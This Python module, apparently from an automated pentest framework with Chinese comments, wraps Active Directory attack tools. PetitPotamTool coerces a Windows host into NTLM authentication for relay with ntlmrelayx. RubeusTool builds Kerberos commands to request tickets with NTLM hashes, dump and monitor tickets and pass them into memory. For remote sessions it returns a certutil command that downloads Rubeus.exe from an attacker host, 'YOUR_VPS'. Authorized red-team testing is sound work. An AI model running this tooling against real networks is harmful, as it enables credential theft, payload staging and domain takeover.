# tools/ad_tools.py
"""
AD域渗透工具集

包含:
- PetitPotam: EfsRpc强制认证攻击
- Rubeus: Kerberos票据操作

注意: dacledit 已移至 impacket_tools.py
"""
import os
import shutil
import subprocess
from typing import Dict, Any, Optional, List
from tool_framework import CommandLineTool


class PetitPotamTool(CommandLineTool):
    """
    PetitPotam - EfsRpc强制认证攻击

    用途: 强制Windows主机向攻击者进行NTLM认证
    场景: 配合ntlmrelayx进行域提权
    """

    def __init__(self):
        self.cmd_path = "python3"
        self.script_path = None

        # 查找PetitPotam.py - 添加更多路径
        possible_paths = [
            "./PetitPotam.py",
            "/opt/PetitPotam/PetitPotam.py",
            "/usr/share/PetitPotam.py",
            "/app/thirdparty/PetitPotam/PetitPotam.py",  # Dockerfile路径
            "/app/thirdparty/petitpotam/PetitPotam.py",
            "/opt/tools/ad/PetitPotam.py",
        ]
        for path in possible_paths:
            if os.path.exists(path):
                self.script_path = path
                break

        super().__init__(self.cmd_path)
        self.timeout = 60

    def name(self) -> str:
        return "petitpotam"

    def description(self) -> str:
        return "PetitPotam - EfsRpc强制认证攻击，配合ntlmrelayx使用"

    def supported_vulns(self) -> list:
        return ["EfsRpc Abuse", "NTLM Relay", "AD Privilege Escalation"]

    def check_available(self) -> bool:
        return self.script_path is not None

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "target": {
                "type": "str",
                "description": "目标主机IP",
                "required": True
            },
            "listener": {
                "type": "str",
                "description": "监听服务器IP (运行ntlmrelayx的主机)",
                "required": True
            },
            "username": {
                "type": "str",
                "description": "用户名",
                "required": False
            },
            "password": {
                "type": "str",
                "description": "密码",
                "required": False
            },
            "domain": {
                "type": "str",
                "description": "域名",
                "required": False
            },
            "method": {
                "type": "str",
                "description": "方法: efsrpc (默认) 或 webdav",
                "required": False,
                "default": "efsrpc"
            }
        }

    def execute(self, target: str, params: Dict) -> Dict:
        target = params.get("target") or target
        listener = params.get("listener")

        if not target or not listener:
            return {"error": "需要 target 和 listener 参数", "success": False}

        if not self.script_path:
            return {
                "error": "PetitPotam.py 未找到",
                "success": False,
                "hint": "git clone https://github.com/topotam/PetitPotam.git"
            }

        # 构建命令
        cmd = [self.cmd_path, self.script_path]

        username = params.get("username")
        password = params.get("password")
        domain = params.get("domain", "")

        if username and password:
            if domain:
                cmd.extend(["-u", username, "-p", password, "-d", domain])
            else:
                cmd.extend(["-u", username, "-p", password])

        # 根据方法选择
        method = params.get("method", "efsrpc")
        if method == "webdav":
            cmd.append(f"{listener}@80/webdav")
        else:
            cmd.append(f"{listener}@{listener}")

        cmd.append(target)

        try:
            result = self._run_command(cmd, timeout=self.timeout, stream_output=True)
            return {
                "success": True,
                "target": target,
                "listener": listener,
                "output": result.get("stdout", ""),
                "notes": "确保ntlmrelayx已在监听服务器运行"
            }
        except Exception as e:
            return {"error": str(e), "success": False}


class RubeusTool(CommandLineTool):
    """
    Rubeus - Kerberos票据操作工具

    常用功能:
    - asktgt: 请求TGT
    - monitor: 监控票据
    - ptt: 导入票据
    - dump: 导出票据
    """

    COMMANDS = {
        "asktgt": "请求TGT票据",
        "monitor": "监控新票据",
        "ptt": "导入票据到内存",
        "dump": "导出当前会话票据",
        "klist": "列出票据",
        "s4u": "S4U2Self/S4U2Proxy",
        "tgssub": "修改TGS服务名"
    }

    def __init__(self):
        # 检查多个可能的路径
        possible_paths = [
            "/opt/tools/windows/Rubeus.exe",  # Dockerfile下载路径
            os.path.join("data", "tools", "Rubeus.exe"),
            os.path.join("tools", "Rubeus.exe"),
            "./Rubeus.exe",
            "C:\\tools\\Rubeus.exe",
        ]

        self.binary_path = None
        for path in possible_paths:
            if os.path.exists(path):
                self.binary_path = path
                break

        self.cmd_path = self.binary_path or "Rubeus.exe"
        super().__init__(self.cmd_path)
        self.timeout = 60

    def name(self) -> str:
        return "rubeus"

    def description(self) -> str:
        return "Rubeus - Kerberos票据操作工具"

    def supported_vulns(self) -> list:
        return ["Kerberos Attack", "Ticket Manipulation", "S4U Delegation"]

    def check_available(self) -> bool:
        return self.binary_path is not None

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "command": {
                "type": "str",
                "description": f"命令: {', '.join(self.COMMANDS.keys())}",
                "required": True
            },
            "user": {
                "type": "str",
                "description": "用户名",
                "required": False
            },
            "rc4": {
                "type": "str",
                "description": "RC4/NTLM哈希",
                "required": False
            },
            "domain": {
                "type": "str",
                "description": "域名",
                "required": False
            },
            "dc": {
                "type": "str",
                "description": "域控IP或主机名",
                "required": False
            },
            "ticket": {
                "type": "str",
                "description": "票据文件路径或base64",
                "required": False
            },
            "shell_session": {
                "type": "str",
                "description": "远程shell会话",
                "required": False
            }
        }

    def execute(self, target: str, params: Dict) -> Dict:
        command = params.get("command")
        shell_session = params.get("shell_session")

        if command not in self.COMMANDS:
            return {"error": f"未知命令: {command}", "success": False}

        # 生成命令
        if command == "asktgt":
            user = params.get("user", "")
            rc4 = params.get("rc4", "")
            domain = params.get("domain", "")
            dc = params.get("dc", "")

            rubeus_cmd = f"Rubeus.exe asktgt /user:{user} /rc4:{rc4}"
            if domain:
                rubeus_cmd += f" /domain:{domain}"
            if dc:
                rubeus_cmd += f" /dc:{dc}"
            rubeus_cmd += " /nowrap"

        elif command == "monitor":
            target_user = params.get("user", "")
            rubeus_cmd = "Rubeus.exe monitor /interval:1 /nowrap"
            if target_user:
                rubeus_cmd += f" /targetuser:{target_user}"

        elif command == "ptt":
            ticket = params.get("ticket", "")
            rubeus_cmd = f"Rubeus.exe ptt /ticket:{ticket}"

        elif command == "dump":
            rubeus_cmd = "Rubeus.exe dump /nowrap"

        else:
            rubeus_cmd = f"Rubeus.exe {command}"

        # 远程执行
        if shell_session:
            upload_cmd = f"certutil -urlcache -split -f http://YOUR_VPS/Rubeus.exe C:\\temp\\Rubeus.exe"
            return {
                "success": True,
                "mode": "remote",
                "upload_command": upload_cmd,
                "exec_command": f"C:\\temp\\{rubeus_cmd}",
                "notes": ["先上传Rubeus.exe", "然后执行命令"]
            }

        # 本地执行需要Windows环境
        return {
            "success": True,
            "command": rubeus_cmd,
            "notes": "在Windows目标机器上执行此命令"
        }


def register():
    """注册AD工具"""
    from tool_framework import ToolRegistry
    ToolRegistry.register(PetitPotamTool())
    ToolRegistry.register(RubeusTool())